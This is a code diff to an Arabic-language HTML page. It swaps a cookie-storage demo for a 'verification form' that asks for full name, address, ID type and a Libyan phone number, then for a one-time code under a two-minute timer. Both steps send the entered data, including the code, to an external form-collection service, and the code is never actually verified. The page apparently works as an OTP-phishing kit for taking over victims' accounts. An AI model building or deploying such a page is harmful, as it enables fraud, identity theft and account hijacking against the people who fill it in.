@@ -2,99 +2,197 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>تخزين الاسم والهاتف في الكوكيز</title>
+  <title>نموذج التحقق</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      margin: 30px auto;
+      background: #f2f2f2;
       padding: 20px;
-      max-width: 500px;
-      background-color: #f9f9f9;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      direction: rtl;
     }
-    label, input, button {
-      display: block;
-      width: 100%;
+    .form-container {
+      max-width: 500px;
+      margin: auto;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+    }
+    .form-group {
       margin-bottom: 15px;
-      font-size: 16px;
+    }
+    label {
+      display: block;
+      font-weight: bold;
+    }
+    input, select {
+      width: 100%;
+      padding: 8px;
+      margin-top: 5px;
     }
     button {
-      background-color: #28a745;
+      padding: 10px 20px;
+      background-color: #005fa3;
       color: white;
       border: none;
-      padding: 10px;
+      border-radius: 5px;
       cursor: pointer;
-      border-radius: 5px;
     }
-    button:hover {
-      background-color: #218838;
+    #verification-section {
+      display: none;
     }
-    #result {
-      background-color: #e9ecef;
-      padding: 10px;
-      border-radius: 5px;
-      font-family: monospace;
+    #timer {
+      font-weight: bold;
+      color: red;
+      margin: 10px 0;
     }
   </style>
 </head>
 <body>
+  <div class="form-container">
+    <form id="main-form">
+      <div id="step1">
+        <div class="form-group">
+          <label>الاسم بالكامل</label>
+          <input type="text" id="fullName" required pattern="^[\u0600-\u06FF\s]{5,}$" title="الاسم يجب أن يكون باللغة العربية وبحد أدنى 5 أحرف">
+        </div>
 
-  <h2>نموذج تخزين البيانات بالكوكيز</h2>
+        <div class="form-group">
+          <label>العنوان</label>
+          <input type="text" id="address" required>
+        </div>
 
-  <label for="username">الاسم الكامل:</label>
-  <input type="text" id="username" placeholder="أدخل اسمك الكامل">
+        <div class="form-group">
+          <label>نوع الوثيقة (اختياري)</label>
+          <select id="documentType">
+            <option value="">بدون</option>
+            <option value="جواز السفر">جواز السفر</option>
+            <option value="البطاقة الشخصية">البطاقة الشخصية</option>
+          </select>
+        </div>
 
-  <label for="phone">رقم الهاتف:</label>
-  <input type="text" id="phone" placeholder="أدخل رقم هاتفك">
+        <div class="form-group">
+          <label>رقم الهاتف</label>
+          <input type="text" id="phone" required pattern="^09[1-5][0-9]{7}$" title="رقم ليبي صحيح يبدأ بـ 091 إلى 095 ويتكون من 10 أرقام">
+        </div>
 
-  <button onclick="saveCookies()">حفظ البيانات</button>
-  <button onclick="showCookies()">عرض البيانات المخزنة</button>
+        <button type="button" onclick="submitStep1()">أكمل الطلب</button>
+      </div>
 
-  <h3>البيانات المخزنة:</h3>
-  <p id="result">لا توجد بيانات بعد.</p>
+      <div id="verification-section">
+        <div class="form-group">
+          <label>رمز التحقق</label>
+          <input type="text" id="code" pattern="^[a-zA-Z0-9]{6,8}$" required>
+        </div>
+
+        <div class="form-group">
+          <label>إعادة كتابة رمز التحقق</label>
+          <input type="text" id="confirmCode" required>
+        </div>
+
+        <div id="timer">02:00</div>
+
+        <button type="button" onclick="submitAll()">تحقيق الرمز</button>
+        <button type="button" id="resendBtn" onclick="restartTimer()" style="display:none;">إعادة إرسال الرمز</button>
+      </div>
+    </form>
+  </div>
 
   <script>
-    // حفظ البيانات في الكوكيز لمدة سنة
-    function saveCookies() {
-      const username = document.getElementById("username").value.trim();
-      const phone = document.getElementById("phone").value.trim();
+    let countdown;
+    let timeLeft = 120;
 
-      if (!username || !phone) {
-        alert("يرجى ملء جميع الحقول");
+    function startTimer() {
+      timeLeft = 120;
+      document.getElementById('resendBtn').style.display = 'none';
+      countdown = setInterval(() => {
+        const minutes = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+        const seconds = String(timeLeft % 60).padStart(2, '0');
+        document.getElementById('timer').textContent = `${minutes}:${seconds}`;
+        timeLeft--;
+        if (timeLeft < 0) {
+          clearInterval(countdown);
+          document.getElementById('timer').textContent = "انتهى الوقت!";
+          document.getElementById('resendBtn').style.display = 'inline';
+        }
+      }, 1000);
+    }
+
+    function restartTimer() {
+      document.getElementById('code').value = '';
+      document.getElementById('confirmCode').value = '';
+      startTimer();
+    }
+
+    function submitStep1() {
+      const fullName = document.getElementById('fullName').value.trim();
+      const address = document.getElementById('address').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+      const documentType = document.getElementById('documentType').value;
+
+      const nameValid = /^[\u0600-\u06FF\s]{5,}$/.test(fullName);
+      const phoneValid = /^09[1-5][0-9]{7}$/.test(phone);
+
+      if (!nameValid || !phoneValid || !address) {
+        alert("يرجى تعبئة البيانات بشكل صحيح.");
         return;
       }
 
-      const expires = "expires=Fri, 31 Dec 2025 23:59:59 UTC; path=/";
-      document.cookie = "username=" + encodeURIComponent(username) + ";" + expires;
-      document.cookie = "phone=" + encodeURIComponent(phone) + ";" + expires;
+      const formData = new FormData();
+      formData.append('الاسم', fullName);
+      formData.append('العنوان', address);
+      formData.append('نوع الوثيقة', documentType);
+      formData.append('رقم الهاتف', phone);
 
-      alert("تم حفظ البيانات في الكوكيز ✅");
+      fetch('https://formcarry.com/s/pHHZOWhpgsB', {
+        method: 'POST',
+        body: formData
+      }).then(() => {
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('verification-section').style.display = 'block';
+        startTimer();
+      }).catch(() => {
+        alert("حدث خطأ أثناء الإرسال. حاول مجددًا.");
+      });
     }
 
-    // استخراج قيمة معينة من الكوكيز
-    function getCookieValue(name) {
-      const value = document.cookie.split('; ').find(row => row.startsWith(name + '='));
-      return value ? decodeURIComponent(value.split('=')[1]) : '';
-    }
+    function submitAll() {
+      const code = document.getElementById('code').value.trim();
+      const confirmCode = document.getElementById('confirmCode').value.trim();
 
-    // عرض البيانات المخزنة
-    function showCookies() {
-      const name = getCookieValue("username");
-      const phone = getCookieValue("phone");
-
-      if (name || phone) {
-        document.getElementById("result").textContent =
-          "الاسم: " + name + "\nرقم الهاتف: " + phone;
-      } else {
-        document.getElementById("result").textContent = "لا توجد بيانات مخزنة.";
+      if (timeLeft < 0) {
+        alert("انتهى الوقت! يرجى إعادة إرسال الرمز.");
+        return;
       }
+
+      if (!/^[a-zA-Z0-9]{6,8}$/.test(code)) {
+        alert("الرمز يجب أن يكون بين 6 إلى 8 حروف أو أرقام.");
+        return;
+      }
+
+      if (code !== confirmCode) {
+        alert("رمز التحقق غير متطابق.");
+        return;
+      }
+
+      const fullName = document.getElementById('fullName').value.trim();
+      const address = document.getElementById('address').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+
+      const formData = new FormData();
+      formData.append('الاسم', fullName);
+      formData.append('العنوان', address);
+      formData.append('رقم الهاتف', phone);
+      formData.append('رمز التحقق', code);
+
+      fetch('https://formcarry.com/s/pHHZOWhpgsB', {
+        method: 'POST',
+        body: formData
+      }).then(() => {
+        alert("تم إرسال البيانات بنجاح.");
+      }).catch(() => {
+        alert("فشل في إرسال رمز التحقق.");
+      });
     }
-
-    // عرض البيانات تلقائياً عند تحميل الصفحة إن وجدت
-    window.onload = showCookies;
   </script>
-
 </body>
 </html>
